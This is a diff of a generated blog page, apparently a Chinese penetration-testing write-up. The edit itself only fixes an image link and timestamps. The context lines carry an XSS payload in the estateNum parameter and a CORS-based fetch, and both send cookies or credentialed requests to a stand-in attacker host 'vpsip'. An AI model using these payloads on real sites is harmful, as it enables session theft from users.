@@ -29,9 +29,9 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://raw.githubusercontents.com/sing3r/image/main/hexoImage092eeed1e9fa915c8985c2a087b3dc70cb2ae208237b57553d10d673ab0fc2fa.png">
 <meta property="og:image" content="https://raw.githubusercontents.com/sing3r/image/main/hexoImage5df36167c363ec25aa15d73dba71def23b69d5a4ec2bc1a802cfcf38c4f40947.png">
-<meta property="og:image" content="https://raw.githubusercontents.com/sing3r/image/main/hexoImagecd39cd156fbd98fd9es82d558c8e6c777ff10e811cacb798e7fd78e09f055a0d6.png">
+<meta property="og:image" content="https://raw.githubusercontents.com/sing3r/image/main/hexoImagecd39cd156fbd98fd9e82d558c8e6c777ff10e811cacb798e7fd78e09f055a0d6.png">
 <meta property="article:published_time" content="2023-02-06T12:38:59.797Z">
-<meta property="article:modified_time" content="2023-02-06T13:09:04.934Z">
+<meta property="article:modified_time" content="2023-02-06T13:29:49.288Z">
 <meta property="article:author" content="sing">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontents.com/sing3r/image/main/hexoImage092eeed1e9fa915c8985c2a087b3dc70cb2ae208237b57553d10d673ab0fc2fa.png">
@@ -221,7 +221,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2023-02-06 20:38:59 / Modified: 21:09:04" itemprop="dateCreated datePublished" datetime="2023-02-06T20:38:59+08:00">2023-02-06</time>
+              <time title="Created: 2023-02-06 20:38:59 / Modified: 21:29:49" itemprop="dateCreated datePublished" datetime="2023-02-06T20:38:59+08:00">2023-02-06</time>
             </span>
 
           
@@ -254,7 +254,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?estateNum=1111&#x27;;fetch(&#x27;http://vpsip/&#x27;+document.cookie,&#123;method: &#x27;GET&#x27;&#125;);//</span><br></pre></td></tr></table></figure>
 
 <p>查看网络发现，发送的 Cookie 字段不完整，真正有用的 JSESSIONID 缺失了。原来 JSESSIONID 设置了 HttpOnly 属性。喵喵喵？？？？</p>
-<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage5df36167c363ec25aa15d73dba71def23b69d5a4ec2bc1a802cfcf38c4f40947.png"><br><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImagecd39cd156fbd98fd9es82d558c8e6c777ff10e811cacb798e7fd78e09f055a0d6.png"></p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage5df36167c363ec25aa15d73dba71def23b69d5a4ec2bc1a802cfcf38c4f40947.png"><br><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImagecd39cd156fbd98fd9e82d558c8e6c777ff10e811cacb798e7fd78e09f055a0d6.png"></p>
 <h2 id="CORS-利用"><a href="#CORS-利用" class="headerlink" title="CORS 利用"></a>CORS 利用</h2><p>既然无法直接发送Cookie，那就换个方式吧。修改 JavaScript 代码，通过 fetch() 进行携带 Cookie 的跨域访问以获取 Cookie。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://vpsip/&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 
